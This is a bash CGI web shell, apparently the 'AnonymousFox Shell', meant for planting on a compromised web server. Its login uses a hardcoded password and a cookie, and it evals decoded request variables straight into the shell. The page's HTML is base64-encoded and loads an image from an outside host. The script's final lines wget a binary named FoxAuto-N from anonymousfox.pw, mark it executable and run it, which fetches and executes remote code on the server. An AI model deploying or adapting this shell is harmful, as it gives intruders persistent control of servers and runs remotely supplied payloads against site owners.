#!/bin/bash -i

#
password="xXx"


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
	echo "Warning: you should probably use MIME type "\
	     "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
	read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" 
	t="${t#*%}"       
	
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} 
	    t="${t:2}" 
	    v="${v}"`echo -e \\\\x${h}` 
	fi
    done
    
    echo "${v}"
    return
}


function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
	GET)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    ;;
	POST)
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
	    ;;
	BOTH)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
	    ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
	p="${q%%&*}"  # get first part of query string
	k="${p%%=*}"  # get the key (variable name) from it
	v="${p#*=}"   # get the value from it
	q="${q#$p&*}" # strip first part from query string
	# decode and evaluate var if requested
	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
	    eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL

pass="SAVEDPWD=$password"
passv=`echo $HTTP_COOKIE | awk '$pass|'  -f0`

if [ $cc2 -eq 4 ] ; then
clear
echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
exit
else

if [ -n "$xx"  ] ; then
echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
else
echo -e "Content-type: text/html\n\n"
fi

fi
echo 'PGh0bWw+PHRpdGxlPkFub255bW91c0ZveCBTaGVsbDwvdGl0bGU+CjxoZWFkPgo8c3R5bGU+Cgpi
b2R5CnsKCWJhY2tncm91bmQ6ICMzMzM7Cgljb2xvcjogI0Y1RjVGNTsKCglwYWRkaW5nOiAxMHB4
OwoKfQoKCmE6bGluaywgYm9keV9hbGluawp7Cgljb2xvcjogI0ZGOTkzMzsKCXRleHQtZGVjb3Jh
dGlvbjogbm9uZTsKfQphOnZpc2l0ZWQsIGJvZHlfYXZpc2l0ZWQKewoJY29sb3I6ICNGRjk5MzM7
Cgl0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KYTpob3ZlciwgYTphY3RpdmUsIGJvZHlfYWhvdmVy
CnsKCWNvbG9yOiAjRkZGRkZGOwoJdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9Cgp0ZXh0YXJlYQp7
Cglib3JkZXI6IDFweCBzb2xpZDsKCWN1cnNvcjogZGVmYXVsdDsKCQoJYmFja2dyb3VuZDogIzAw
MDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4
IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBG
aXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQoKaW5wdXQKewoJYm9yZGVyOiAxcHggc29saWQ7
CgljdXJzb3I6IGRlZmF1bHQ7CglvdmVyZmxvdzogaGlkZGVuOwoJYmFja2dyb3VuZDogIzAwMDsK
CWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIw
cHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJl
Zm94IDMuNiBhbmQgZWFybGllciAqLwoKfQppbnB1dC5idXR0b24gewpmb250LWZhbWlseTogQ291
cmllciBOZXc7CmNvbG9yOiAjZmZmZmZmOwpmb250LXNpemU6IDE2cHg7CnBhZGRpbmc6IDEwcHg7
CnRleHQtZGVjb3JhdGlvbjogbm9uZTsKLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA4cHg7Ci1tb3ot
Ym9yZGVyLXJhZGl1czogOHB4Owotd2Via2l0LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFi
YWI7Ci1tb3otYm94LXNoYWRvdzogMHB4IDFweCAzcHggI2FiYWJhYjsKdGV4dC1zaGFkb3c6IDFw
eCAxcHggM3B4ICM2NjY2NjY7CmJvcmRlcjogc29saWQgI2RlZGJkZSAxcHg7CmJhY2tncm91bmQ6
ICM5MDkwOTAgOwp9Ci5idXR0b246aG92ZXIgewpiYWNrZ3JvdW5kOiAjQjBCMEIwOwp9CgogZGl2
LmJveAp7CmNvbG9yOiAjMzMzOwpib3JkZXI6M3B4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6MTBw
eCA0MHB4OyAKYmFja2dyb3VuZDojZThlOGU4Owp3aWR0aDo5NCU7CmJvcmRlci1yYWRpdXM6MjVw
eDsKLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICov
Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48aW1nIHNy
Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d

rm -rf /tmp/FoxAuto
wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-N
chmod +x FoxAuto-N
./FoxAuto-N 0
